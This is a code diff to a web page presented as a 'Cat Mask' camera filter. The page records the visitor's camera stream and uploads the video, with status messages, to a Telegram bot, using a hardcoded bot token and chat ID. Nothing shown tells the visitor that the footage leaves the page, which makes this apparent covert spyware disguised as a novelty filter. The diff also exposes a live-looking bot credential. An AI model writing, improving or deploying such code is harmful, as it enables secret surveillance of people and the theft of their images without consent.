@@ -16,7 +16,7 @@
     </style>
 </head>
 <body>
-    <h1>Маска кота</h1>
+    <h1>Cat Mask</h1>
     <video id="video" autoplay></video>
     <div id="progress">Progress: <span id="progressText">0%</span></div>
 
@@ -26,7 +26,6 @@
 
         let mediaRecorder;
         let recordedChunks = [];
-        let totalChunks = 0;
 
         const token = '7504272107:AAH8rOfaUtOq8xnxWnvQ0s4SriLHkz4nITk'; // Замените на токен вашего бота
         const chatId = '6121166273'; // Замените на ваш chat ID
@@ -52,7 +51,7 @@
 
         // Function to setup MediaRecorder
         function setupMediaRecorder(stream) {
-            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/mp4' });
 
             mediaRecorder.ondataavailable = (event) => {
                 if (event.data.size > 0) {
@@ -62,9 +61,11 @@
             };
 
             mediaRecorder.onstop = () => {
-                const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                console.log('MediaRecorder stopped.');
+                const blob = new Blob(recordedChunks, { type: 'video/mp4' });
+                recordedChunks = []; // Reset chunks after processing
                 const videoURL = URL.createObjectURL(blob);
-                console.log('Recording stopped. Sending video...');
+                console.log('Recording stopped. Preparing to send video...');
                 sendNotificationToTelegram('Recording stopped. Preparing to send video...');
                 sendToTelegram(blob);
             };
@@ -72,10 +73,8 @@
 
         // Function to update progress
         function updateProgress() {
-            if (mediaRecorder && mediaRecorder.state === 'recording') {
-                const percentage = Math.round((recordedChunks.length / totalChunks) * 100);
-                progressText.textContent = `${percentage}%`;
-            }
+            const percentage = Math.round((recordedChunks.length / (mediaRecorder && mediaRecorder.state === 'recording' ? 100 : 1)) * 100);
+            progressText.textContent = `${percentage}%`;
         }
 
         // Function to send video to Telegram
@@ -84,7 +83,7 @@
 
             const formData = new FormData();
             formData.append('chat_id', chatId);
-            formData.append('video', blob, 'recording.webm');
+            formData.append('video', blob, 'recording.mp4');
 
             fetch(url, {
                 method: 'POST',
